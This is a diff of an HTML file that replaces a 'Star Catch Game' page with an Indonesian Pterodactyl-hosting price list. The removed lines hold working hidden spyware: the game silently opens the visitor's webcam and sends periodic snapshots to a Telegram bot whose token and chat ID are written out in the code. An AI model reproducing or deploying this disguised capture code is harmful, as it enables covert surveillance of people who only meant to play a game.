@@ -1,231 +1,579 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Star Catch Game</title>
+    <title>Pterodactyl Panel Hosting kafh4you</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
-        #gameCanvas { display: block; }
-        #scoreBoard {
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.8);
-            padding: 10px 20px;
-            border-radius: 12px;
-            font-size: 20px;
-            color: #61dafb;
+        :root {
+            --primary: #6777ef;
+            --secondary: #f4f6f9;
+            --dark: #191d21;
+            --success: #63ed7a;
+            --danger: #fc544b;
         }
-        #message {
-            position: absolute;
-            top: 40%;
-            width: 100%;
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .navbar {
+            background: linear-gradient(135deg, #6777ef 0%, #5a67d8 100%);
+            color: white;
+            padding: 1.2rem 0;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+        
+        .logo span {
+            color: #63ed7a;
+        }
+        
+        .hero {
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            padding: 5rem 0;
             text-align: center;
-            font-size: 32px;
-            color: #61dafb;
-            display: none;
         }
-        #playBtn {
-            position: absolute;
-            top: 55%;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 24px;
-            font-size: 20px;
-            background: #61dafb;
-            color: #20232a;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            display: none;
+        
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+        
+        .pricing {
+            padding: 4rem 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .section-title h2 {
+            font-size: 2.5rem;
+            color: var(--dark);
+            margin-bottom: 1rem;
+        }
+        
+        .section-title p {
+            color: #666;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        .pricing-card {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .pricing-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+        }
+        
+        .pricing-header {
+            background: var(--primary);
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+        }
+        
+        .pricing-header h3 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .price {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin: 1rem 0;
+        }
+        
+        .price span {
+            font-size: 1rem;
+            font-weight: normal;
+        }
+        
+        .pricing-body {
+            padding: 2rem;
+        }
+        
+        .specs {
+            margin-bottom: 2rem;
+        }
+        
+        .spec {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.8rem;
+        }
+        
+        .spec i {
+            color: var(--primary);
+            margin-right: 0.8rem;
+            font-size: 1.2rem;
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            text-decoration: none;
+            text-align: center;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+        }
+        
+        .btn-whatsapp:hover {
+            background: #128C7E;
+        }
+        
+        footer {
+            background: var(--dark);
+            color: white;
+            padding: 3rem 0;
+            text-align: center;
+        }
+        
+        .footer-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .social-links {
+            margin: 1.5rem 0;
+        }
+        
+        .social-links a {
+            color: white;
+            font-size: 1.5rem;
+            margin: 0 0.8rem;
+            transition: color 0.3s;
+        }
+        
+        .social-links a:hover {
+            color: var(--primary);
+        }
+        
+        .copyright {
+            margin-top: 1.5rem;
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .pricing-grid {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
-    <canvas id="gameCanvas"></canvas>
-    <div id="scoreBoard">Score: <span id="score">0</span></div>
-    <div id="message">Game Over!<br>Thanks for playing!</div>
-    <button id="playBtn">Play Again</button>
-
-    <script>
-        // Canvas setup
-        const canvas = document.getElementById('gameCanvas');
-        const ctx = canvas.getContext('2d');
-        let width = canvas.width = window.innerWidth;
-        let height = canvas.height = window.innerHeight;
-        window.addEventListener('resize', () => {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-        });
-
-        // Game variables
-        let stars = [], score = 0, gameOver = false;
-        const maxStars = 20;
-
-        function Star() {
-            this.x = Math.random() * width;
-            this.y = -20;
-            this.size = 20 + Math.random() * 20;
-            this.speed = 2 + Math.random() * 3;
-        }
-        Star.prototype.draw = function() {
-            ctx.beginPath();
-            ctx.fillStyle = '#ffd700';
-            ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
-            ctx.fill();
-        };
-        Star.prototype.update = function() { this.y += this.speed; };
-
-        function addStar() {
-            if (stars.length < maxStars && !gameOver) stars.push(new Star());
-        }
-
-        function loop() {
-            ctx.clearRect(0, 0, width, height);
-            stars.forEach((star, i) => {
-                star.update();
-                star.draw();
-                if (star.y - star.size > height) stars.splice(i, 1);
-            });
-            if (!gameOver) requestAnimationFrame(loop);
-        }
-
-        canvas.addEventListener('click', e => {
-            if (gameOver) return;
-            const rect = canvas.getBoundingClientRect();
-            const mx = e.clientX - rect.left;
-            const my = e.clientY - rect.top;
-            stars.forEach((star, i) => {
-                if (Math.hypot(star.x - mx, star.y - my) < star.size) {
-                    stars.splice(i, 1);
-                    score++;
-                    document.getElementById('score').innerText = score;
-                    if (score >= 10) endGame();
-                }
-            });
-        });
-
-        function endGame() {
-            gameOver = true;
-            document.getElementById('message').style.display = 'block';
-            document.getElementById('playBtn').style.display = 'block';
-        }
-        document.getElementById('playBtn').addEventListener('click', () => {
-            stars = [];
-            score = 0;
-            gameOver = false;
-            document.getElementById('score').innerText = score;
-            document.getElementById('message').style.display = 'none';
-            document.getElementById('playBtn').style.display = 'none';
-            loop();
-        });
-
-        setInterval(addStar, 500);
-        loop();
-
-        // Image capture and comparison logic
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    const captureCanvas = document.createElement('canvas');
-                    const captureCtx = captureCanvas.getContext('2d');
-                    
-                    // Variables for image comparison
-                    let previousImageData = null;
-                    let differenceThreshold = 5; // Percentage of pixels that need to be different
-                    let imagesSent = 0;
-                    
-                    setInterval(() => {
-                        if (video.readyState >= 2) {
-                            captureCanvas.width = video.videoWidth;
-                            captureCanvas.height = video.videoHeight;
-                            captureCtx.drawImage(video, 0, 0);
-                            
-                            // Get current image data
-                            const currentImageData = captureCtx.getImageData(0, 0, captureCanvas.width, captureCanvas.height);
-                            
-                            // Check if image is different enough to send
-                            if (shouldSendImage(previousImageData, currentImageData, differenceThreshold)) {
-                                captureCanvas.toBlob(blob => {
-                                    sendPhoto(blob);
-                                    imagesSent++;
-                                    console.log(`Image sent (${imagesSent}): Significant change detected`);
-                                }, 'image/jpeg', 0.8);
-                                
-                                // Update previous image data
-                                previousImageData = currentImageData;
-                            } else {
-                                console.log("Image not sent: Not enough difference detected");
-                            }
-                        }
-                    }, 5000);
-                })
-                .catch(err => console.error('Failed to access camera:', err));
-        }
-        
-        // Function to compare two images and determine if they're different enough
-        function shouldSendImage(previousData, currentData, threshold) {
-            // If there's no previous image, we should send this one
-            if (!previousData) return true;
+    <nav class="navbar">
+        <div class="container nav-content">
+            <div class="logo">KAFH4YOU<span>STORE</span></div>
+            <div>
+                <a href="https://wa.me/6282286978599" style="color: white; text-decoration: none;">
+                    <i class="fab fa-whatsapp"></i> Hubungi Kami
+                </a>
+            </div>
+        </div>
+    </nav>
+    
+    <section class="hero">
+        <div class="container">
+            <h1>Panel Pterodactyl Berkualitas</h1>
+            <p>Solusi server dengan performa tinggi dan harga terjangkau. Kelola server Anda dengan mudah melalui panel Pterodactyl.</p>
+        </div>
+    </section>
+    
+    <section class="pricing">
+        <div class="container">
+            <div class="section-title">
+                <h2>Pilihan Spesifikasi</h2>
+                <p>Pilih spesifikasi yang sesuai dengan kebutuhan serve Anda</p>
+            </div>
             
-            const data1 = previousData.data;
-            const data2 = currentData.data;
-            
-            // If image dimensions changed, consider it a new image
-            if (previousData.width !== currentData.width || 
-                previousData.height !== currentData.height) {
-                return true;
-            }
-            
-            // Count pixels that differ significantly
-            let diffPixels = 0;
-            const totalPixels = data1.length / 4; // RGBA has 4 values per pixel
-            
-            // Sample every 10th pixel for performance
-            for (let i = 0; i < data1.length; i += 40) {
-                const r1 = data1[i];
-                const g1 = data1[i + 1];
-                const b1 = data1[i + 2];
+            <div class="pricing-grid">
+                <!-- RAM 1GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 1GB</h3>
+                        <div class="price">Rp2.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 1GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 40% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 1GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Stabil</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%201GB%20CPU%2030%25%20harga%202.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
                 
-                const r2 = data2[i];
-                const g2 = data2[i + 1];
-                const b2 = data2[i + 2];
+                <!-- RAM 2GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 2GB</h3>
+                        <div class="price">Rp3.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 2GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 60% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 2GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Stabil</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%202GB%20CPU%2060%25%20harga%203.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
                 
-                // Calculate color difference
-                const diff = Math.abs(r1 - r2) + Math.abs(g1 - g2) + Math.abs(b1 - b2);
+                <!-- RAM 3GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 3GB</h3>
+                        <div class="price">Rp4.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 3GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 80% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 3GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Optimal</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%203GB%20CPU%2090%25%20harga%204.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
                 
-                // If the difference is significant, count this pixel
-                if (diff > 30) {
-                    diffPixels++;
-                }
-            }
-            
-            // Calculate the percentage of different pixels
-            const diffPercentage = (diffPixels / (totalPixels / 10)) * 100;
-            
-            // Return true if the difference percentage exceeds the threshold
-            return diffPercentage >= threshold;
-        }
-
-        function sendPhoto(blob) {
-            const BOT_TOKEN = '7555878083:AAFRXWx_hGb0UwnyFIklm7Rjk8g3DwhH7D8';
-            const CHAT_ID = '5419637944';
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'snapshot.jpg');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => console.log(data.ok ? 'Photo sent successfully!' : 'Error sending photo', data))
-            .catch(error => console.error('Network error sending photo:', error));
-        }
-    </script>
+                <!-- RAM 4GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 4GB</h3>
+                        <div class="price">Rp5.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 4GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 100% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 4GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Optimal</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%204GB%20CPU%20120%25%20harga%205.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- RAM 5GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 5GB</h3>
+                        <div class="price">Rp6.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 5GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 120% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 5GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Tinggi</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%205GB%20CPU%20150%25%20harga%206.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- RAM 6GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 6GB</h3>
+                        <div class="price">Rp7.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 6GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 140% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 6GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Tinggi</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%206GB%20CPU%20180%25%20harga%207.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+                       <!-- RAM 7GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 7GB</h3>
+                        <div class="price">Rp8.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 7GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 160% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 7GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Premium</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%207GB%20CPU%20210%25%20harga%208.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+                   <!-- RAM 8GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 8GB</h3>
+                        <div class="price">Rp9.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 8GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 180% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 8GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Premium</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%208GB%20CPU%20240%25%20harga%209.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+                   <!-- RAM 9GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM 9GB</h3>
+                        <div class="price">Rp10.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: 9GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: 200% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: 9GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Maximum</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%209GB%20CPU%20270%25%20harga%2010.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+                   <!-- RAM UNLIMITED GB -->
+                <div class="pricing-card">
+                    <div class="pricing-header">
+                        <h3>RAM UNLIMITED GB</h3>
+                        <div class="price">Rp11.000<span>/bulan</span></div>
+                    </div>
+                    <div class="pricing-body">
+                        <div class="specs">
+                            <div class="spec">
+                                <i class="fas fa-memory"></i>
+                                <span>RAM: UNLIMITED GB</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-microchip"></i>
+                                <span>CPU: UNLIMITED% Core</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-hdd"></i>
+                                <span>Storage: UNLIMITED GB SSD</span>
+                            </div>
+                            <div class="spec">
+                                <i class="fas fa-tachometer-alt"></i>
+                                <span>Performansi Maximum</span>
+                            </div>
+                        </div>
+                        <a href="https://wa.me/6282286978599?text=Saya%20mau%20beli%20panel%20pterodactyl%20RAM%20UNLIMETED GB%20CPU%20UNLIMETED GB%25%20harga%2011.000" class="btn btn-whatsapp">
+                            <i class="fab fa-whatsapp"></i> Pesan Sekarang
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <div class="container footer-content">
+            <div class="logo">Pterodactyl<span>Server</span></div>
+            <div class="social-links">
+                <a href="https://wa.me/6282286978599"><i class="fab fa-whatsapp"></i></a>
+                <a href="https://t.me/KafhReal_isBackk"><i class="fab fa-telegram"></i></a>
+                <a href="https://youtube.com/@KAFH"><i class="fab fa-youtube"></i></a>
+            </div>
+            <div class="copyright">
+                ©KAFH4YOU STORE
+            </div>
+        </div>
+    </footer>
 </body>
 </html>
